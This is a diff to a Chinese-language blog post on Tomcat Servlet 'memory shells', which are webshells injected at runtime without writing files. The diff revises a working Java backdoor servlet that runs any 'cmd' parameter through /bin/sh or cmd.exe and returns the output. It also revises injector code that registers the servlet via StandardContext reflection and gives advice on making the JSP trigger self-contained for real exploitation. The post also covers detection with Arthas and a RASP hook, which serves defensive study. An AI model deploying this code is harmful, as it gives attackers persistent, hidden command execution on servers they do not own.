@@ -14,6 +14,8 @@ tags:
 
 Servlet 型内存马通过在 Tomcat 运行时动态注册恶意 Servlet，映射到指定 URL 路径，访问该路径即可触发命令执行。与 Filter 型内存马的区别在于：Servlet 作用于请求处理的末端（Filter 链之后），但同样不需要文件落地。
 
+**本质**：模拟 `createWrapper` + `addChild` + `addServletMappingDecoded`，把恶意 `service` 代码 + `/shell` 路径组装进 `children` 与 Mapper 路由表，访问该路径即被路由到恶意 Servlet。整体框架见 [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %})。
+
 ---
 
 ## 一、Tomcat Servlet 架构
@@ -100,6 +102,8 @@ context.addServletMappingDecoded("/hello", "HelloServlet");
 8. 调用 wrapper.load() 初始化 Servlet（执行 init()）
 ```
 
+> 获取 `StandardContext` 的通用反射链（`RequestFacade.request` → `connector.Request.getContext()`，或 `ServletContext` → `ApplicationContext` → `StandardContext`）见 [Filter 篇 2.1]({% post_url 2025-12-27-Tomcat_filter内存马的 %})。
+
 ### 2.1 URL 映射原理
 
 Tomcat 使用 `Mapper` 组件做 URL → Wrapper 的路由匹配：
@@ -128,10 +132,9 @@ StandardContextValve → StandardWrapperValve → servlet.service()
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
-import java.lang.reflect.Field;
-import java.util.Scanner;
 
 public class ServletMemShell extends HttpServlet {
 
@@ -147,47 +150,44 @@ public class ServletMemShell extends HttpServlet {
         handleRequest(req, resp);
     }
 
-    private void handleRequest(HttpServletRequest req, HttpServletResponse resp) 
+    private void handleRequest(HttpServletRequest req, HttpServletResponse resp)
             throws IOException {
         String cmd = req.getParameter("cmd");
         if (cmd != null && !cmd.isEmpty()) {
             try {
-                // 支持 Windows 和 Linux
-                boolean isWindows = System.getProperty("os.name")
-                    .toLowerCase().contains("windows");
-                String[] fullCmd = isWindows 
-                    ? new String[]{"cmd.exe", "/c", cmd}
-                    : new String[]{"/bin/sh", "-c", cmd};
-
-                Process process = Runtime.getRuntime().exec(fullCmd);
-                InputStream inputStream = process.getInputStream();
-                
-                // 读取命令输出并回显
-                Scanner scanner = new Scanner(
-                    inputStream, 
-                    System.getProperty("sun.jnu.encoding")
-                ).useDelimiter("\\A");
-                
-                String result = scanner.hasNext() ? scanner.next() : "";
-                
-                // 同时读取错误流
-                InputStream errorStream = process.getErrorStream();
-                Scanner errorScanner = new Scanner(
-                    errorStream,
-                    System.getProperty("sun.jnu.encoding")
-                ).useDelimiter("\\A");
-                String errorResult = errorScanner.hasNext() ? errorScanner.next() : "";
-                
+                String result = exec(cmd);
                 resp.setContentType("text/html;charset=UTF-8");
-                resp.getWriter().write("<pre>" + result + errorResult + "</pre>");
-                
-                scanner.close();
-                errorScanner.close();
+                resp.getWriter().write("<pre>" + result + "</pre>");
             } catch (Exception e) {
                 resp.getWriter().write("Error: " + e.getMessage());
             }
         } else {
             resp.getWriter().write("Servlet Memory Shell Active");
+        }
+    }
+
+    /**
+     * 统一命令执行器（本系列 Filter / Servlet / Listener 三篇通用）
+     * - 通过 shell 执行，支持管道、重定向等语法（/bin/sh -c 或 cmd /c）
+     * - redirectErrorStream(true)：把 stderr 合并进 stdout，避免
+     *   "先读 stdout 再读 stderr" 顺序读取时管道写满导致的两端互相阻塞
+     * - 字节循环读取而非 Scanner，输出量大时不会阻塞
+     */
+    private static String exec(String cmd) throws Exception {
+        String[] execCmd = System.getProperty("os.name").toLowerCase().contains("windows")
+                ? new String[]{"cmd.exe", "/c", cmd}
+                : new String[]{"/bin/sh", "-c", cmd};
+
+        Process process = new ProcessBuilder(execCmd).redirectErrorStream(true).start();
+        try (ByteArrayOutputStream out = new ByteArrayOutputStream();
+             InputStream is = process.getInputStream()) {
+            byte[] buf = new byte[4096];
+            int len;
+            while ((len = is.read(buf)) != -1) {
+                out.write(buf, 0, len);
+            }
+            process.waitFor();
+            return out.toString(System.getProperty("sun.jnu.encoding"));
         }
     }
 }
@@ -225,15 +225,18 @@ public class ServletMemShellInjector {
         StandardWrapper wrapper = (StandardWrapper) context.createWrapper();
         wrapper.setName(servletName);
         wrapper.setServletClass(ServletMemShell.class.getName());
+        // loadOnStartup > 0：addChild() 内部触发 start() 时会立即 loadServlet()
         wrapper.setLoadOnStartup(1);
 
         // Step 3: 注册为 Context 的子容器
+        // addChild() 内部（ContainerBase.addChildInternal）会自动调用 child.start()，
+        // 由 loadOnStartup=1 触发 Servlet 实例化
         context.addChild(wrapper);
 
-        // Step 4: 配置 URL 映射
+        // Step 4: 配置 URL 映射（新映射立即写入内部 Mapper，无需重启）
         context.addServletMappingDecoded(urlPattern, servletName);
 
-        // Step 5: 启动 Wrapper（初始化 Servlet 实例）
+        // Step 5: 幂等初始化（addChild 已触发 start，此处为防御性写法）
         wrapper.load();
         wrapper.start();
     }
@@ -260,6 +263,8 @@ public class ServletMemShellInjector {
 ```
 
 ### 3.3 触发注入的 JSP
+
+> 说明：以下 JSP 引用默认包类 `ServletMemShellInjector`，为**讲解简化**（假设恶意类已部署）。真实利用时 JSP 必须**自包含**——把恶意类内联进 `<%! %>` 并直接注册（写法见 [Valve 篇 3.4]({% post_url 2026-08-06-Tomcat_Valve内存马 %})），或由反序列化 `defineClass` 提供类；测试工程已提供自包含版本。
 
 ```jsp
 <%@ page import="org.apache.catalina.core.*, org.apache.catalina.connector.Request,
@@ -342,6 +347,20 @@ if (context.findChild(servletName) != null) {
 
 通过 `context.findChild(name)` 检查是否已存在同名子容器，避免重复注册。
 
+### 4.5 版本兼容性
+
+| Tomcat 版本 | Servlet 包 | 说明 |
+|-------------|-----------|------|
+| 8.x / 9.x | `javax.servlet` | 本系列代码适用 |
+| 10.x / 11.x | `jakarta.servlet` | 需全局替换包名 |
+
+- `addChild()` + `addServletMappingDecoded()` 的机制在 Tomcat 8/9/10/11 上一致，
+  10+ 只需把 `javax.servlet` 换成 `jakarta.servlet`。
+- 反射链依赖的字段（`RequestFacade.request`、`connector.Request.response`）在不同大版本间相对
+  稳定，但属于私有字段，字段名变更时注入/回显会失败，实战前需确认目标版本。
+- `wrapper.load()/start()` 与 `addChild()` 内部触发的 `start()` 相比是幂等操作
+  （`LifecycleBase.start()` 对已 STARTED 状态直接返回），重复调用无副作用。
+
 ---
 
 ## 五、利用场景
@@ -402,8 +421,8 @@ vmtool --action getInstances \
   --express 'instances[0].servletClass' \
   --limit 20
 
-# 查看 Servlet 映射
-ognl '@org.apache.catalina.core.StandardContext@servletMappings'
+# 查看 Servlet 映射（servletMappings 是实例字段，静态 OGNL 语法拿不到，需先拿实例）
+vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express 'instances[0].servletMappings' --limit 10
 ```
 
 ### 6.3 内存 Dump 分析
@@ -447,16 +466,26 @@ public static Map<String, String> getServletMappings(StandardContext ctx) {
 | **运维** | 定期巡检 | 对比 Servlet 基线 |
 
 ```java
-// RASP Hook 示例
+// RASP Hook 示例（教学简化版）
 @RuntimeType
-public static void onAddChild(@This ContainerBase container, 
+public static void onAddChild(@This ContainerBase container,
                                @Argument(0) Container child) {
-    if (!isStartupPhase() && container instanceof StandardContext) {
-        // 非启动阶段添加子容器 → 可疑行为
-        alert("Detected runtime Servlet injection: " + child.getName());
-        throw new SecurityException("Suspicious container modification blocked");
+    if (!(container instanceof StandardContext)) {
+        return;
     }
-}
+    // 正常启动 / 部署流程会经过 ContextConfig 调用栈，运行时反射注入没有它
+    StackTraceElement[] stack = Thread.currentThread().getStackTrace();
+    for (StackTraceElement frame : stack) {
+        if (frame.getClassName().contains("ContextConfig")) {
+            return; // 属于启动 / 部署流程，放行
+        }
+    }
+    // 其余 addChild 调用（如运行时反射注入 Wrapper）→ 告警并阻断
+    alert("Detected runtime Servlet injection: " + child.getName());
+    throw new SecurityException("Suspicious container modification blocked");
+    // 说明：以"调用栈是否含 ContextConfig"做白名单是教学简化；生产环境还需排除
+    // Tomcat 热部署、嵌入式容器自身启动等合法场景，建议结合线程名与调用来源综合判断。
+    }
 ```
 
 ---
@@ -477,4 +506,4 @@ Servlet 内存马与 Filter 内存马的对比：
 - **备选 Servlet**：更隐蔽（部分监控产品不检查 Wrapper），适合作为备用通道
 - **组合使用**：Filter + Servlet 双保险，互为备份
 
-> **延伸阅读**：[Tomcat Filter 内存马](/2025/12/27/tomcat-filter-memory-shell/) | [Tomcat Listener 内存马](/2025/12/27/tomcat-listener-memory-shell/) | [Tomcat基础](/2025/12/30/tomcat-basics/)
+> **延伸阅读**：[Tomcat Filter 内存马]({% post_url 2025-12-27-Tomcat_filter内存马的 %}) | [Tomcat Listener 内存马]({% post_url 2025-12-27-Tomcat_ listener内存马 %}) | [Tomcat Valve 内存马]({% post_url 2026-08-06-Tomcat_Valve内存马 %}) | [Java Agent 内存马]({% post_url 2026-08-06-Java_Agent内存马 %}) | [Spring 容器内存马]({% post_url 2026-08-06-Spring_容器内存马 %}) | [WebSocket 等偏门内存马]({% post_url 2026-08-06-Tomcat_WebSocket等偏门内存马 %}) | [Tomcat基础]({% post_url 2025-12-30-Tomcat基础 %})
